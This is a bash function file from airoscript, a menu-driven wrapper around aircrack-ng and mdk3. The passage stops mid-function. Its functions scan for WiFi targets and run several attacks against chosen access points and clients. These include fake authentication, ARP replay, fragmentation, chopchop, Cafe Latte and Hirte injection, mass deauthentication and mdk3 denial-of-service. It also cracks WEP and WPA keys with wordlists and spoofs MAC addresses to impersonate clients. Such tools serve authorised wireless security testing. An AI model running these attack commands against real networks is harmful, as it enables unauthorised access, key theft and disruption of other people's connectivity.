#!/bin/bash
# Funcion file used by airoscript
# Copyright (C) 2010 David Francos Cuartero
#        This program is free software; you can redistribute it and/or
#        modify it under the terms of the GNU General Public License
#        as published by the Free Software Foundation; either version 2
#        of the License, or (at your option) any later version.

#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#        GNU General Public License for more details.

#        You should have received a copy of the GNU General Public License
#        along with this program; if not, write to the Free Software
#        Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

CHOICES="1 2 3 4 5 6 7 8 9 10 11 12"

menu(){
    if [ "$AUTO" == 1 ]; then return; fi
    setps; mkmenu "Main Menu" "Attack   - Attack target" "Crack    - Get target key"  "Scan - Manually scan for targets" "Select - Reselect target" "Others   - Various utilities"  "Auto     - Does 1,2,3" "Exit    - Quits"
}

eassideng(){
    while true; do $clear
    mkmenu "Easside-ng" "Create virtual interface" "Run buddy server" "Return to main menu"
        echo _ "Option number: "
        read yn
        case $yn in
            1 )
                while true; do $clear
                    read -p "Select buddy IP" buddyip; $clear
                    mkmenu "Choose ap mac " "Choose source mac " "Chosse Source IP " "Choose router ip " "Execute" "Return"; echo
                        read -p "Option number: " yn; echo
                        read -p "Anser: " answer; echo
                        case $yn in
                            1 ) opts=" $opts -v $answer " ;break ;;
                            2 ) opts=" $opts -m $answer " ;break ;;
                            3 ) opts=" $opts -i $answer " ;break ;;
                            4 ) opts=" $opts -r $answer " ;break ;;
                            5 ) execute "Easside-ng" $EASSIDE -s $buddyip -f $wifi $opts ;break ;;
                            6 ) $clear; break ;;
                        esac
                    done ;;
            2 ) execute $BUDDY ;;
            3 ) $clear ; break ;;
            * ) $clear; echo  _ "Unknow response, try again"; sleep 2 ;;
        esac
    done
}

## This is for SCAN (1) option: ###########################
choosetype(){
    if [ "$AUTO" == 1 ]; then ENCRYPT="$1"; return; fi # We actually just try to crack wep on autpwn mode. 

    while true; do $clear
        mkmenu "Select encryption" "No filter" "OPN (open)" "WEP" "WPA" "WPA1" "WPA2" "Return to main menu"
        echo "Option number: "
        read yn
        case $yn in
            1 ) ENCRYPT="" ; choosescan; break ;;
            2 ) ENCRYPT="OPN" ; choosescan; break ;;
            3 ) ENCRYPT="WEP" ; choosescan; break ;;
            4 ) ENCRYPT="WPA" ; choosescan; break ;;
            5 ) ENCRYPT="WPA1" ; choosescan; break ;;
            6 ) ENCRYPT="WPA2" ; choosescan; break ;;
            7 ) break;;
            * ) _ 'Unknown response. Try again' ;;
      esac
    done
}

choosescan(){
    if [ "$AUTO" == 1 ]; then Scan; return; fi

    while true; do
        arrow; mkmenu "Channel" "Channel Hoping" "Specific Channel"
        read yn
        case $yn in
            1 ) Scan;break;;
            2 ) Scanchan;break;;
            * ) _ "Unknown response. Try again" ;;
        esac
    done
}
#Subproducts of choosescan.
Scan(){
    export SCAN=1
    $clear; rm -rf $DUMP_PATH/dump*
    execute "Scanning for targets" $AIRODUMP -w $DUMP_PATH/dump --encrypt $ENCRYPT -a $wifi
    export SCAN=0
}

Scanchan(){
    export SCAN=1;
    arrow; echo -e "\n `gettext '
    +------------Channel Input----------+
    |       Please input channel        |
    |                                   |
    |          You can insert:          |
    |   A single number   6             |
    |   A range           1-5           |
    |   Multiple channels 1,1,2,5-7,11  |
    +-----------------------------------+
    '`"
    read channel_number; set -- ${channel_number}
    $clear; rm -rf $DUMP_PATH/dump*; monmode $wifi $channel_number
    execute "Scanning for targets on channel $channel_number" $AIRODUMP -w $DUMP_PATH/dump --channel $channel_number --encrypt $ENCRYPT -a $wifi
    export SCAN=0
}

# This is for SELECT (2) option
Parseforap(){
    i=0; ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
    head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv ; $clear

    if [ "$AUTO" != 1 ]; then
        _ "\tDetected Access point list" "\n"
        _ "#\t\tMAC\t\tCHAN\tSECU\tPOWER\t#CHAR\t\tSSID" "\n"
    fi
    while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
        longueur=${#MAC}
        if [ $longueur -ge 17 ]; then
            i=$(($i+1))
            if [ "$AUTO" != 1  ]; then
                echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
            fi
            aidlenght=$IDLENGTH
            assid[$i]=$ESSID; achannel[$i]=$CHANNEL; 
            amac[$i]=$MAC; aprivacy[$i]=$PRIVACY;
            aspeed[$i]=$SPEED
        fi
    done < $DUMP_PATH/dump-02.csv


    if [ "$AUTO" == 1 ]; then
        CURRENT=$(( $CURRENT + 1 ))
        choice=$CURRENT
    else
        _ 'Select target: '
        read choice
    fi

    idlenght=${aidlenght[$choice]}
    ssid=${assid[$choice]}
    channel=${achannel[$choice]}
    mac=${amac[$choice]}
    privacy=${aprivacy[$choice]}
    speed=${aspeed[$choice]}
    Host_IDL=$idlength
    Host_SPEED=$speed
    Host_ENC=$privacy
    Host_MAC=$mac
    Host_CHAN=$channel
    acouper=${#ssid}
    fin=$(($acouper-idlength))
    Host_SSID=${ssid:1:fin}
    echo "Target network is $Host_SSID $Host_MAC"
    sleep 2
}

choosetarget(){
    if [ "$AUTO" == 1 ]; then return; fi
    while true; do
        mkmenu "Client Selection" "Detect clients" "Select from associated clients" "Select from all clients" "Manually enter client MAC" "No select client"
        read yn
        case $yn in
            1 ) detectclients ; break ;;
            2 ) SelectClient dump-01.csv filter; break ;;
            3 ) SelectClient dump-01.csv nofilter; breack;; 
            4 ) arrow; mkbox "Client selection" "Type in client mac now"; read Client_MAC; set -- ${Client_MAC} ; break ;;
            5 ) break ;;
            * ) echo -e "`gettext \"Unknown response. Try again\"`"; sleep 1; $clear ;;
          esac
    done
}


# This way we detect clients. (Option 3)
detectclients(){
    if [ "$AUTO" == "1" ]; then return; fi
    $iwconfig $wificard channel $Host_CHAN; capture & deauthall && read -p "Press enter to select client"; SelectClient $Host_MAC-01.csv filter
}

SelectClient(){
    HOST=`cat $DUMP_PATH/$1 | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC|sed 's/,//'`
    if [ "$2" == "nofilter" ]; then HOST=`cat $DUMP_PATH/dump-01.csv | grep -a "0.:..:..:..:.." | awk '{ print $1 }'| grep -a -v 00:00:00:00`; fi
    if [ "$AUTO" == "1" ]; then return; fi;  [[ -z $HOST ]] && return
    arrow; mkbox "Client Selection" "Select client now" "These clients are connected to $Host_SSID "
    select CLIENT in $HOST; do export Client_MAC=` echo $CLIENT | awk '{split($1, info, "," )  print info[1]  }'`; break;done
}

# This is for ATTACK (3) option
 witchattack(){ monmode
            if [[ "$Host_ENC" =~ (.*)"WEP"(.*) ]]; then attackwep
            elif [[ "$Host_ENC" =~ (.*)"WPA"(.*) ]]; then attackwpa
            else attackopn; fi
        }

        # If wep
        attackwep(){
            while true; do $clear  
                mkmenu "Wep Attacks" "-   Attacks not using a client" "Fake auth => Automatic  " "Fake auth => Interactive" "Fragmentation attack " "Chopchop attack " "Cafe Latte attack " "Hirte attack " "separator"	"- Attacks using a client "	"ARP replay => Automatic"	"ARP replay => Interactive"	"Fragmentation attack "	"Frag. attack on client "	"Chopchop attack"	"separator"	"-  Injection if xor file generated "	"ARP inject from xor (PSK) " "Return to main menu "

                read -p "Enter attack:" yn
                echo ""
                case $yn in
                    1  ) fakeautoattack ; break ;;
                    2  ) fakeinteractiveattack;$clear ; break ;;
                    3  ) fragnoclient ;$clear; break ;;
                    4  ) chopchopattack ;$clear; break ;;
                    5  ) cafelatteattack ;$clear; break ;;
                    6  ) hirteattack ;$clear; break ;;
                    7  ) attackclient ;$clear; break ;;
                    8  ) interactiveattack ;$clear; break ;;
                    9  ) fragmentationattack -5 ;$clear; break ;;
                    10 ) fragmentationattack -7 ;$clear ; break ;;  
                    11 ) chopchopattackclient;$clear ; break ;;
                    12 ) pskarp ;$clear; break ;;
                    13 ) $clear;break ;;
                    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
                esac
            done
}

#Option 1 (fake auth auto)
fakeautoattack(){
    if [ "$INTERACTIVE" == 1 ]; then
        read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
        if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi

        read -p "`gettext \"Enable From or To destination bit (f/t):  \"`" FT
        if [ "$FT" = "" ]; then FT="f"; fi

    else
        INJMAC="FF:FF:FF:FF:FF:FF"
        FT="f"
    fi

    capture & execute "Injection: Host: $Host_MAC" $AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86 -h $FAKE_MAC -x $INJECTRATE & choosefake 

}
#Option 2 (fake auth interactive)
fakeinteractiveattack(){
    if [ "$INTERACTIVE" == "1" ]; then
        read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
        if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
        read -p "`gettext \"Set framecontrol word (hex): (0841) \"`" FT
        if [ "$FT" = "" ]; then FT="0841"; fi
    else
        INJMAC="FF:FF:FF:FF:FF:FF"
        FT="0841"
    fi
    capture & execute  "Interactive Packet Sel on Host: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE & choosefake
}

#Option 3 (fragmentation attack)
fragnoclient(){
    rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
    killall -9 airodump-ng aireplay-ng 
    execute "Fragmentation w/o client" $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi & capture & choosefake &  injectmenu frag
}

#Option 4 (chopchopattack)
chopchopattack(){
    $clear && hardclean  replay_dec-*.xor
    capture &  fakeauth3 & 
    execute "Chopchoping: $Host_MAC" $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi & injectmenu chopchop
}

#Option 5 (caffe late attack)
cafelatteattack(){
    capture & execute  "Cafe Latte Attack on: $Host_SSID " $AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $iwifi & fakeauth3 
}

#Option 6 (hirte attack)
hirteattack(){
    capture & execute "Hirte Attack on: $Host_SSID" $AIREPLAY -7 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $iwifi & fakeauth3 
}

#Option 7 (Auto arp replay)
attackclient(){
    if [ "$INTERACTIVE" == "1" ]; then
        read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
        if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
        read -p "`gettext 'Enable From or To destination bit (f/t):  '`" FT
        if [ "$FT" = "" ]; then FT="f"; fi
    else INJMAC="FF:FF:FF:FF:FF:FF"; FT="f"; fi
    capture & execute "Injection in Host: $Host_MAC Client $Client_MAC" $AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE 
}

#Option 8 (interactive arp replay)
interactiveattack(){
    if [ "$INTERACTIVE" == 1 ]; then
        read -p "`gettext 'Enter destination mac: (FF:FF:FF:FF:FF:FF)'`" INJMAC
        if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
        read -p "`gettext 'Set framecontrol word (hex): (0841) '`" FT
        if [ "$FT" = "" ]; then FT="0841"; fi
    else INJMAC="FF:FF:FF:FF:FF:FF"; FT="0841"; fi
    capture & execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE 
}

#Option 9 (fragmentation attack)
fragmentationattack(){
    rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
    killall -9 airodump-ng aireplay-ng
    execute "Fragmentation attack" $AIREPLAY $1 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi & capture &  injectmenu frag
}
#Option 11
chopchopattackclient(){
    $clear && hardclean  replay_dec-*.xor
    capture & execute "ChopChoping: $Host_SSID" $AIREPLAY --chopchop -h $Client_MAC $iwifi & injectmenu chopchop
}
#Option 12 (pskarp)
pskarp(){
    rm -rf $DUMP_PATH/arp_*.cap
    execute "Forging package" $ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
    execute "PSK ARP Replaying" $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $iwifi 
}
# End of subproducts.

attackopn(){ # If no encryption detected
    if [ "$Host_SSID" = "" ]; then
        $clear &&  echo  "`gettext 'ERROR: You have to select a target'`"
    else
        $clear && echo `gettext "ERROR: Network not encrypted or no network selected "`
    fi
}


attackwpa(){
    while true; do
        $clear; mkmenu "Select WPA Attack" "Standard attack" "Standard attack with QoS (WMM)"
        read n
        case $n in
            1) wpahandshake; $clear; break;;
            2) tkiptunstdqos; $clear; break;;
    esac
done
    }

    # 1 just capture
    wpahandshake(){
        $clear && hardclean
        execute "Capturing data on channel: $Host_CHAN"  $AIRODUMP -w $DUMP_PATH/$Host_MAC -b $Host_MAC --channel $Host_CHAN - -a $wifi 
    }

    # 2 Use tkiptun-ng
    tkiptunstdqos(){
        $clear && hardclean 
        ifconfig $wificard channel $Host_CHAN # Hope this is ok for all cards
        execute "Executing tkiptun-ng for ap $Host_MAC"  $TKIPTUN -h $FAKE_MAC -a $Host_MAC -m $TKIPTUN_MIN_PL -n $TKIPTUN_MAX_PL  $wifi 
    }


    # This is for CRACK (4)  option
witchcrack(){
			while true; do
                arrow; mkmenu "WEP/WPA Cracking Options" "Autocrack" "Wlandecrypter" "Jazzteldecripter" "Standard aircrack-ng" "Return to menu" &&  read yn
				case $yn in
					1 ) echo "AUTO"; sleep 2; auto ; break ;;
					2 ) echo "WLD"; sleep 2; wld ; sleep 2; break ;;
					3 ) echo "JTD"; sleep 2; jtd ; break ;;
					4 ) selectcracking ; break ;;
					5 ) $clear; break;;
					* ) echo "Unknown response. Try again" ;;
				esac
			done
}

selectcracking(){
	if [ "$Host_ENC" = "OPN" ] || [ "$Host_ENC" = "" ] || [ "$Host_ENC" = " OPN " ]; then
		$clear && _ "ERROR: Network not encrypted or no network selected "
	else
		if [ "$Host_ENC" = " WEP " ] || [ "$Host_ENC" = "WEP" ]; then crack
		else wpacrack; fi
	fi
}

#This is crack function, for WEP encryption:
    crack(){
        if [ "$AUTO" == 1 ]; then
	    	execute "Cracking wep" $AIRCRACK -0 -a 1 -b $Host_MAC -f $FUDGEFACTOR -l $DUMP_PATH/$Host_MAC.key -0 -s $DUMP_PATH/$Host_MAC-01.cap
            return
        fi

		while true; do
        mkmenu "WEP Cracking Options" "aircrack-ng defaults" "aircrack-ng Korek" "aircrack-ng interactive"
		read -p "Select option: " yn
		case $yn in
	    	1 ) execute "Cracking wep, default options" crack $AIRCRACK -0 -a 1 -b $Host_MAC -f $FUDGEFACTOR -l $DUMP_PATH/$Host_MAC.key -0 -s $DUMP_PATH/$Host_MAC-01.cap ; $clear; break ;;
	    	2 ) execute "Cracking wep, Korek" crack $AIRCRACK -0 -a 1 -b $Host_MAC -f $FUDGEFACTOR -l $DUMP_PATH/$Host_MAC.key -0 -s $DUMP_PATH/$Host_MAC-01.cap -K ; $clear; break ;;
	    	3 ) read -p "Insert Fudge Factor: " FUDGE_FACTOR;
                read -p "`gettext 'Type encryption size (64,128...): '`" ENC_SIZE
			    execute "Cracking wep, manual options" crack $AIRCRACK -0 -a 1 -b $Host_MAC -f $FUDGE_FACTOR\
                -n $ENC_SIZE -0 -s $DUMP_PATH/$Host_MAC-*.cap -f $DUMP_PATH/$Host_MAC.key &  $clear; 
                break ;;
	    	* ) echo "`gettext 'Unknown response. Try again'`" ;;
		esac
		done
	}

	# This is for wpa cracking
    wpacrack(){
		    while true; do
                mkmenu "WPA Cracking Options" "Standard" "Use precomputed pmk database"
                read -p "Select option: " foo

                case $foo in
                    1)  execute "Cracking WPA" crack $AIRCRACK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST  ; $clear;;
                    2)  $clear; read -p "Enter Database location [$db_location]" db_location;
                        execute "Cracking WPA with pmk database" crack  $AIRCRACK -b $Host_MAC -s $DUMP_PATH/$Host_MAC-01.cap -r $db_location;;
	    	        * ) echo "`gettext 'Unknown response. Try again'`" ;;
        		esac
	      	done
                
    }
	
# This is for Fake auth  (5)  option
choosefake(){
if [ "$Host_SSID" = "" ]; then $clear; echo "ERROR: You have to select a target first"
else
    if [ "$INTERACTIVE" == "1" ]; then
    	while true; do
            mkmenu "Fake Auth Method" "Conservative" "Standard" "Progressive" "Xor Injection"
    		read yn; case $yn in
		    	1 ) fakeauth1 ;$clear; break ;;
		    	2 ) fakeauth2 ;$clear; break ;;
		    	3 ) fakeauth3 ;$clear; break ;;
		    	4 ) fakeauth4 ;$clear; break ;;
		    	* ) echo "Unknown response. Try again" ;;
	        esac
    	done
    else fakeauth1||fakeauth2||fakeauth3; $clear; fi
fi
}


# Those are subproducts of choosefake
    fakeauth1(){
        execute "Fake auth (1) " $AIREPLAY --fakeauth 6000 -o 1 -q 10 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $iwifi 
	}
    fakeauth2(){
        execute "Fake auth (2) " $AIREPLAY --fakeauth 0 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $iwifi 
	}
    fakeauth3(){
        execute "Fake auth (3) " $AIREPLAY --fakeauth 5 -o 10 -q 1 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $iwifi 
    }
    fakeauth4(){
        execute "Fake auth (4) " $AIREPLAY -1 0 -e "$HOST_SSID" -y $DUMP_PATH/*.xor -a $Host_MAC -h $FAKE_MAC $iwifi
    }

    # This is for deauth  (6)  option
    choosedeauth(){
        if [ "$Host_SSID" = "" ]; then $clear
            echo "ERROR: You have to select a target first"
        else
            while true; do
                arrow; mkmenu "Who do you want to deauth?" "Everybody" "Myself (fake mac)" "Selected client"
                read yn; $clear
                case $yn in
                    1 ) deauthall ; break ;;
                    2 ) deauthfake ; break ;;
                    3 ) deauthclient ; break ;;
                    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
    esac
done
    fi
}

# Subproducts of choosedeauth
deauthall(){
    execute "Deauth All" $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC $wifi
}

deauthclient(){
    if [ "$Client_MAC" = "" ]; then 
        $clear; echo "ERROR: You have to select a client first"
    else 
        execute "Deauth client" $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC \
            -c $Client_MAC $iwifi
    fi
}

deauthfake(){
    execute "Deautenticating" $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $FAKE_MAC $iwifi
}


# This is for others  (7)  option

decrypt(){
# TODO decrypt packages.
    echo "Error: Not yet implemented"; sleep 3 && $clear
}

optionmenu(){
        mkmenu "Airoscript options"  "Select another interface" "Reset selected interface"\
            "Change MAC of interface"  "Enable monitor mode" "Change DUMP_PATH"\
            "Try to configure network" "Return to main menu"

        read -p "Select option: " yn; 
        case $yn in
        1 ) setinterface 1 ; $clear; break ;;
        2 ) cleanup; $clear; break ;;
        3 ) wichchangemac ; $clear; break ;;
        4 ) monmode;$clear ; break ;;
        5 ) changedumppath;$clear; break;;
        6 ) configure;$clear; break;;
        7 ) $clear;break ;;
        * ) _ "Unknown response. Try again" ;;
        esac
}

diagmenu(){
    while true; do
        mkmenu "Diagnostic tools and reports" "Show kstats report" "Test injection" "Checks with airmon-ng" "Create graphs" "Return to main menu"
        read -p "Select option: " yn; 
        case $yn in
            1  ) kstatsmenu    ; $clear; break;;
            2  ) inject_test   ; $clear; break;;
            3  ) airmoncheck   ; $clear; break;;
            4  ) _airgraph     ; $clear; break;;
            5  )                 $clear; break;;
            *  ) _ "Unknown response, try again"; sleep 1; $clear;;
        esac
    done
}

authmenu(){
    while true; do
        mkmenu "Autentication menu" "Fake autentication" "Deautentication" "Return to main menu"
        read -p "Select option: " yn; 
        case $yn in
            1  ) choosefake    ; $clear; break;;
            2  ) choosedeauth  ; $clear; break;;
            3  ) $clear ; break;;
            *  ) _ "Unknown response, try again"; sleep 1; $clear;;
        esac
    done
}

othertmenu(){
    while true; do
    mkmenu "Other aircrack-ng tools" "Injection" "Autentication" "Operations with ivstools" "Decloak packages" "Create virtual interface with airtun-ng" "Diagnostics and reports" "mdk3" "Auto crack wep with wesside-ng" "Easside-ng" "Return to main menu"

        read -p "Select option: " yn; 
        case $yn in
            1  ) injectmenu    ; $clear; break;;
            2  ) authmenu      ; $clear; break;;
            3  ) ivstoomenu    ; $clear; break;;
            4  ) airdecmenu    ; $clear; break;;
            5  ) airtunmenu    ; $clear; break;;
            6  ) diagmenu      ; $clear; break;;
            7  ) choosemdk     ; $clear; break;;
            8  ) choosewesside ; $clear; break;;
            9  ) eassideng     ; $clear; break;;
            10 ) $clear        ; break ;;
            *  ) _ "Unknown response, try again"; sleep 1; $clear;;
        esac
    done
}

_airgraph(){
    if [ "$Host_MAC" == "" ]; then
        read -p "Enter format (CPG|CAPR): " g
        read -p "Do you want to launch a browser? [y|N] " yn
        execute "Generating graphics" $AIRGRAPH -i $DUMP_PATH/$Host_MAC.csv -o $DUMP_PATH/$Host_MAC.png -g $g
        [ $yn == "y" ] && sensible-browser $DUMP_PATH/$Host_MAC.png
    else $clear; _ "Error: You have to scan for targets first"; fi
}

airdecmenu(){
    while true; do
        if [ "$d_cloaked_null" == 1 ]; then d_cloaked_null_status="X"; else d_cloaked_null_status=" "; fi
        if [ "$d_cloaked_base" == 1 ]; then d_cloaked_base_status="X"; else d_cloaked_base_status=" "; fi
        if [ "$d_cloaked_frag" == 1 ]; then d_cloaked_frag_status="X"; else d_cloaked_frag_status=" "; fi

        mkmenu "Airdecloak-ng" "Asume that null packets can be cloacked [$d_cloaked_null_status]" "Disable base filter [$d_cloaked_base_status]" "Drop fragmented packets [$d_cloaked_frag_status]" "Specify filters (comma separated)" "Launch decloak" "Return to main menu"
        opts="";
        read -p "Select option: " yn; 
        case $yn in
            1) if [ "$d_cloaked_null" == 1 ]; then d_cloaked_null=0; else d_cloaked_null=1; fi; $clear;;
            2) if [ "$d_cloaked_base" == 1 ]; then d_cloaked_base=0; else d_cloaked_base=1; fi; $clear;;
            3) if [ "$d_cloaked_frag" == 1 ]; then d_cloaked_frag=0; else d_cloaked_frag=1; fi; $clear;;
            4) read -p "Enter filters: " d_cloaked_filters; $clear;;
            5)
                if [ "$d_cloaked_null" == 1 ]; then opts="$opts --null-packets"; fi
                if [ "$d_cloaked_base" == 1 ]; then opts="$opts --diable-base-filter"; fi
                if [ "$d_cloaked_frag" == 1 ]; then opts="$opts --drop-frag"; fi
                execute $AIRDECLOAK $opts --ssid $Host_SSID --bssid $Host_MAC --filters $d_cloaked_filters -i $DUMP_PATH/$Host_MAC-01.cap 
                $clear; break;;
            6) $clear; break;;
        esac
    done
    
}

airtunmenu(){
    if [ "$Host_MAC" != "" ] && [ "$Host_SSID" != "" ] && [ -e $DUMP_PATH/$Host_MAC.key ]; then
        _ "Creating virtual interface" && sleep 2
        $AIRTUN -a $Host_MAC -i $wificard -w "`cat $DUMP_PATH/$Host_MAC.key`"
        _ "Take note of the created virtual interface"; sleep 2; $clear; return
    else
        $clear; echo "You don't have a cracked WEP interface"; sleep 2; $clear; return
    fi
}

kstatsmenu(){
    if [ "$Host_MAC" != "" ] && [ "$Host_SSID" != "" ] && [ -e $DUMP_PATH/$Host_MAC.key ]; then
        _ "Converting to ivs"; sleep 0.2
        $IVSTOOLS --convert $DUMP_PATH/$Host_MAC.cap $DUMP_PATH/$Host_MAC.ivs &> /dev/null
        _ "I'm going to print here kstats info"; sleep 1
        $KSTATS $DUMP_PATH/$Host_MAC-01.ivs `cat $DUMP_PATH/$Host_MAC.key`
        read -p "Enter any key to continue" ktc
    else
        $clear; echo "You don't have a cracked WEP interface"; sleep 2; $clear; return
    fi

}

ivstoomenu(){
    while true; do
        mkmenu "IVs tools" "Merge all ivs from all sessions" "Decrypt current packages"\
            "Return to main menu"
        read -p "Select option: " yn; 
        case $yn in
            1) mergeallivs;$clear; break;;
            2) decrypt; $clear; break;;
            3 ) $clear;break ;;
            * ) _ "Unknown response. Try again" ;;
        esac
    done
}

extramenu(){ 
    while true; do
        mkmenu "Extra tools" "Airoscript Options" "Advanced tools" "Return to main menu"
        read -p "Select option: " yn; 
        case $yn in
            1) optionmenu; $clear; break;;
            2) othertmenu; $clear; break;;
            4 ) $clear;break ;;
            * ) _ "Unknown response. Try again" ;;
        esac
    done
}

# I suppose all these are part of this option:
# 1.
inject_test(){
    execute "Test injection" $AIREPLAY $iwifi --test 
}

# 3.
cleanup(){
    killall -9 aireplay-ng airodump-ng &> /dev/null &
    $AIRMON stop $wificard; ifconfig $wificard down
    $clear; sleep 2; $CARDCTL eject; sleep 2; $CARDCTL insert
    ifconfig $wificard up; $AIRMON start $wificard $Host_CHAN
    $iwconfig $wificard
}

# 4.
wichchangemac(){
    while true; do
        arrow; mkmenu "Mac" "Change MAC to FAKEMAC" "Change MAC to CLIENTMAC" "Use real MAC" "Manual Mac Input" 
        read -p "Input number: " yn
        case $yn in

            1 )	ifconfig $wificard down
                $MACCHANGER -m  $FAKE_MAC $wificard &>/dev/null
                ifconfig $wificard up; break ;;

            2 ) ifconfig $wificard down; sleep 2
                $MACCHANGER -m  $Client_MAC $wificard &>/dev/null
                ifconfig $wificard up ; break ;;
            3)  export FAKE_MAC=$mac
                echo "Using for $wificard $FAKE_MAC = $mac"
                ifconfig $wificard down; sleep 2; 
                $MACCHANGER -m $mac $wificard &>/dev/null
                ifconfig $wificard up;
                break;; 

            4 ) read -p "MAC: " Manual_MAC
                ifconfig $wificard down
                $MACCHANGER -m  $Manual_MAC $wificard &>/dev/null
                ifconfig $wificard up; break ;;

                5 ) if [ -e $XOR_FILE ]; then
                aireplay-ng -1 0  -e teddy -y sharedkey-04-00-14-6C-7E-40-80.xor -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0
            fi;;

            * ) _ "Unknown response. Try again" ;;

        esac
    done
}

# 5.
choosemdk(){
    if [ -x "$MDK3" ]; then
        while true; do
            $clear; mkmenu "Choose MDK3 Options" "Deauthentication" "Prob selected AP" "Select another target" "Autentication DoS" "Return to main menu"
            read yn
            case $yn in
                1 ) mdkpain ; break ;;
                2 ) mdktargetedpain ; break ;;
                3 ) mdknewtarget ; break ;;
                4 ) mdkauth ; break ;;
                5 ) break ;;
                * ) echo "unknown response. Try again" ;;
            esac
        done

        else $clear && echo "Sorry, this is not installed on your system"
        fi
    }

    mdkpain(){
        execute "MDK3 Pain" $MDK3 $wifi d & choosemdk
    }

    mdktargetedpain(){
        execute "MDK3 Targeted pain" $MDK3 $wifi p -b a -c $Host_CHAN -t $Host_MAC & choosemdk
    }

    mdknewtarget(){
        ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
        head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv ; $clear
        echo " +--------------------------------------------------------------------+"
        echo " |       Detected Access point list                                   |"
        echo " |      MAC                      CHAN    SECU    POWER   #CHAR   SSID |"
        echo " |                                                                    |"
        i=0
        while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
            longueur=${#MAC}
            if [ $longueur -ge 17 ]; then i=$(($i+1))
                echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
                aidlenght=$IDLENGTH; assid[$i]=$ESSID; achannel[$i]=$CHANNEL;
                amac[$i]=$MAC; aprivacy[$i]=$PRIVACY; aspeed[$i]=$SPEED
            fi
        done < $DUMP_PATH/dump-02.csv
        echo -n "\n        Select target               "
        read choice
        idlenght=${aidlenght[$choice]};	ssid=${assid[$choice]};
        channel=${achannel[$choice]}; mac=${amac[$choice]};
        privacy=${aprivacy[$choice]};speed=${aspeed[$choice]};
        Host_IDL=$idlength;Host_SPEED=$speed;
        Host_ENC=$privacy;Host_MAC=$mac;
        Host_CHAN=$channel;acouper=${#ssid};
        fin=$(($acouper-idlength));Host_SSID=${ssid:1:fin};
        choosemdk
    }

    mdkauth(){
        execute "MDK3 AUTH" $MDK3 $wifi a & choosemdk
    }

    # 6.
    choosewesside(){
        while true; do
            $clear; mkmenu "Choose Wesside-ng Options" "No args" "Selected target" "Sel. target max retrans" "Sel. target poor conection" "Select another target" "Return to main menu"
            read yn; case $yn in
            1 ) wesside ; break ;;
        2 ) wessidetarget ; break ;;
    3 ) wessidetargetmaxer ; break ;;
4 ) wessidetargetpoor ; break ;;
                    5 ) wessidenewtarget ; break ;;
                6 ) break ;;
            * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
        esac
    done
}

wesside(){
    rm -rf prga.log wep.cap key.log
    execute "Wesside-ng" $WESSIDE -i $wifi & choosewesside
}

wessidetarget(){
    rm -rf prga.log wep.cap key.log
